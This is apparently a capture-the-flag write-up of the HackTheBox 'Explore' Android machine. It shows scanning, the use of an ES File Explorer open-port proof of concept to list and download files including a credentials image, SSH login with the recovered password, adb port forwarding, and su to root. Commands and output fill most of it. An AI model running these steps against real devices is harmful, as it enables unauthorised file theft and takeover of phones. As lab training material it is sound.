# HACKTHEBOX EXPLORE 

![](https://i.imgur.com/qoYfBN8.png)

## Port
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;}
.tg td{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  overflow:hidden;padding:10px 5px;word-break:normal;}
.tg th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;
  font-weight:normal;overflow:hidden;padding:10px 5px;word-break:normal;}
.tg .tg-lboi{border-color:inherit;text-align:left;vertical-align:middle}
.tg .tg-g7sd{border-color:inherit;font-weight:bold;text-align:left;vertical-align:middle}
</style>
<table class="tg">
<thead>
  <tr>
    <th class="tg-g7sd">port</th>
    <th class="tg-g7sd">service</th>
    <th class="tg-g7sd">version</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td class="tg-lboi">2222</td>
    <td class="tg-lboi">ssh</td>
    <td class="tg-lboi">(protocol 2.0)</td>
  </tr>
  <tr>
    <td class="tg-lboi">5555</td>
    <td class="tg-lboi">adb</td>
    <td class="tg-lboi">freeciv</td>
  </tr>
  <tr>
    <td class="tg-lboi">35383</td>
    <td class="tg-lboi">unkwn</td>
    <td class="tg-lboi">unknown</td>
  </tr>
  <tr>
    <td class="tg-lboi">42135</td>
    <td class="tg-lboi">http</td>
    <td class="tg-lboi">ES File Explorer Name Response httpd</td>
  </tr>
  <tr>
    <td class="tg-lboi">59777</td>
    <td class="tg-lboi">http</td>
    <td class="tg-lboi">Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older</td>
  </tr>
</tbody>
</table>

## Nmap
```bash
# Nmap 7.91 scan initiated Sun Jun 27 09:13:27 2021 as: nmap -p- -sCV -oN nmap/nmap.txt --vv 10.10.10.247
Increasing send delay for 10.10.10.247 from 0 to 5 due to 961 out of 3202 dropped probes since last increase.
Nmap scan report for explore.htb (10.10.10.247)
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2021-06-27 09:13:27 IST for 1175s
Not shown: 65530 closed ports
Reason: 65530 resets
PORT      STATE    SERVICE REASON         VERSION
2222/tcp  open     ssh     syn-ack ttl 63 (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
5555/tcp  filtered freeciv no-response
35383/tcp open     unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 27 Jun 2021 04:12:53 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Sun, 27 Jun 2021 04:12:53 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Sun, 27 Jun 2021 04:12:58 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 27 Jun 2021 04:13:15 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 27 Jun 2021 04:12:58 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 27 Jun 2021 04:13:15 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 27 Jun 2021 04:13:16 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Sun, 27 Jun 2021 04:13:16 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open     http    syn-ack ttl 63 ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=6/27%Time=60D7F80C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port35383-TCP:V=7.91%I=7%D=6/27%Time=60D7F80B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
SF:27\x20Jun\x202021\x2004:12:53\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Sun,\x2027\x20Jun\x202021\x2004:1
SF:2:53\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Sun,\x2027\x20Jun\x202021\x
SF:2004:12:58\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Sun,\x2027\x20Jun\x202021\x2004:12:58\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Sun,\x2027\x20Jun\x202021\x2004:13:15\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x2027\x20Jun\x
SF:202021\x2004:13:15\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x202
SF:7\x20Jun\x202021\x2004:13:16\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Sun,\x2027\x20Jun\x202021\x2004:13:16\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 27 09:33:02 2021 -- 1 IP address (1 host up) scanned in 1175.17 seconds
```


# [Exploit](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

![](https://i.imgur.com/KImuKN5.png)


### we can dump all files using the exloit


```bash
╭─root@kali ~/Desktop/htb/Explore/ESFileExplorerOpenPortVuln ‹master*›
╰─# python poc.py --cmd listFiles --ip $IP                                                                                                                         130 ↵
[*] Executing command: listFiles on 10.10.10.247
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", },
{"name":"vndservice_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", },
{"name":"vendor_service_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_seapp_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_property_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", },
{"name":"vendor_hwservice_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"vendor_file_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", },
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"ueventd.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"5.00 KB (5,122 Bytes)", },
{"name":"ueventd.android_x86_64.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"464.00 Bytes (464 Bytes)", },
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"sys", "time":"6/26/21 11:54:12 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"storage", "time":"6/26/21 11:54:20 PM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", },
{"name":"sepolicy", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"357.18 KB (365,756 Bytes)", },
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"sbin", "time":"6/26/21 11:54:12 PM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", },
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"proc", "time":"6/26/21 11:54:11 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"plat_service_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"13.73 KB (14,057 Bytes)", },
{"name":"plat_seapp_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"1.28 KB (1,315 Bytes)", },
{"name":"plat_property_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"6.53 KB (6,687 Bytes)", },
{"name":"plat_hwservice_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"7.04 KB (7,212 Bytes)", },
{"name":"plat_file_contexts", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"23.30 KB (23,863 Bytes)", },
{"name":"oem", "time":"6/26/21 11:54:12 PM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", },
{"name":"odm", "time":"6/26/21 11:54:12 PM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", },
{"name":"mnt", "time":"6/26/21 11:54:13 PM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", },
{"name":"init.zygote64_32.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"875.00 Bytes (875 Bytes)", },
{"name":"init.zygote32.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"511.00 Bytes (511 Bytes)", },
{"name":"init.usb.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"5.51 KB (5,646 Bytes)", },
{"name":"init.usb.configfs.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"7.51 KB (7,690 Bytes)", },
{"name":"init.superuser.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"582.00 Bytes (582 Bytes)", },
{"name":"init.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"29.00 KB (29,697 Bytes)", },
{"name":"init.environ.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"1.04 KB (1,064 Bytes)", },
{"name":"init.android_x86_64.rc", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"3.36 KB (3,439 Bytes)", },
{"name":"init", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", },
{"name":"fstab.android_x86_64", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"753.00 Bytes (753 Bytes)", },
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"dev", "time":"6/26/21 11:54:14 PM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", },
{"name":"default.prop", "time":"6/26/21 11:54:12 PM", "type":"file", "size":"1.09 KB (1,118 Bytes)", },
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", },
{"name":"d", "time":"6/26/21 11:54:11 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"config", "time":"6/26/21 11:54:13 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"cache", "time":"6/26/21 11:54:13 PM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", },
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", },
{"name":"acct", "time":"6/26/21 11:54:12 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```

### Dumping listing all files from 
- it's showing the path also 
- it is showing a creds.jpg file
- so we can downlod this files  


```bash
╭─root@kali ~/Desktop/htb/Explore/ESFileExplorerOpenPortVuln ‹master*› 
╰─# python poc.py --cmd listPics sdcard --ip $IP 
[*] Executing command: listPics on 10.10.10.247
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```

### Downloading files
- creds.jpg

```bash
╭─root@kali ~/Desktop/htb/Explore/ESFileExplorerOpenPortVuln ‹master*› 
╰─# python poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip $IP  
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
        from: 10.10.10.247
[*] Server responded with: 200
[*] Writing to file: creds.jpg
```

````bash
command to view image : eog creds.jpg
````

![](https://i.imgur.com/7pcnty2.png)

## Creads
```bash
user : kristi
pass : Kr1sT!5h@Rp3xPl0r3!
```

# SSH 
-  We can get ssh with this creds ...! 

```bash
╭─root@kali ~/Desktop/htb/Explore/ESFileExplorerOpenPortVuln ‹master*› 
╰─# ssh kristi@$IP -p 2222                               
Password authentication
Password: 
:/ $ whoami
u0_a76
:/ $ uname -a
Linux localhost 4.9.214-android-x86_64-g04f9324 #1 SMP PREEMPT Wed Mar 25 17:11:29 CST 2020 x86_64
:/ $ 
```

# User

- if we check the `sdcard` dir we can see the user.txt file
```bash
:/ $ cd sdcard
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/sdcard $ cat    
cat   catv
:/sdcard $ cat user.txt                                                        
f320*********************50
:/sdcard $
```

# Privesc root 
-  if we check the open ports inside phone we can see port `5555` is listening 
-   port 5555 is  `adb` 
-  its is also running in local host

```bash
130|:/sdcard $ netstat -tuln                                                   
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp6       0      0 ::ffff:127.0.0.1:34789  :::*                    LISTEN     
tcp6       0      0 :::2222                 :::*                    LISTEN     
tcp6       0      0 :::5555                 :::*                    LISTEN     
tcp6       0      0 :::42135                :::*                    LISTEN     
tcp6       0      0 ::ffff:10.10.10.2:44057 :::*                    LISTEN     
tcp6       0      0 :::59777                :::*                    LISTEN     
tcp6       0     80 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.4:58306 ESTABLISHED
tcp6       0      0 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:54162 ESTABLISHED
udp        0      0 10.10.10.247:40894      1.1.1.1:53              ESTABLISHED
udp        0      0 0.0.0.0:5353            0.0.0.0:*                          
udp        0      0 10.10.10.247:34055      1.0.0.1:53              ESTABLISHED
udp        0      0 0.0.0.0:34304           0.0.0.0:*                          
udp6       0      0 :::1900                 :::*                               
udp6       0      0 :::34829                :::*                               
udp6       0      0 :::5353                 :::*                               
udp6       0      0 :::5353                 :::*                               
udp6       0      0 :::5353                 :::*                               
udp6       0      0 ::ffff:10.10.10.2:41359 :::*                               
:/sdcard $ 
```

#### so we can do port forwording 

```bash
╭─root@kali ~/Desktop/htb/Explore ‹master*› 
╰─# ssh -p 2222 -L 5555:localhost:5555 kristi@explore.htb
Password authentication
Password: 
:/ $ 
```

![](https://i.imgur.com/YjcZkOV.png)

## now lets connect to adb  in localhost
- [ADB commands](https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/adb-commands)

```bash
╭─root@kali ~/Desktop/htb/Explore ‹master*› 
╰─# adb connect localhost                                
* daemon not running; starting now at tcp:5037
* daemon started successfully
missing port in specification: tcp:localhost
```

- we can also take adb shell
```bash
╭─root@kali ~/Desktop/htb/Explore ‹master*› 
╰─# adb shell            
x86_64:/ $ whoami
shell
x86_64:/ $
```

- from here we escalate to root using su command
- [privesec method adb ](https://opensourceforgeeks.wordpress.com/2015/11/10/how-to-run-adb-shell-always-as-a-root/)
```sql
╭─root@kali ~/Desktop/htb/Explore ‹master*› 
╰─# adb shell            
x86_64:/ $ su
:/ # whoami
root
:/ # find / -type f -name root.txt 2>/dev/null
/data/root.txt
1|:/ # cat /data/root.txt
f04f*************************8c5
:/ # 
```

# Use full links 
- https://opensourceforgeeks.wordpress.com/2015/11/10/how-to-run-adb-shell-always-as-a-root/
-  https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/adb-commands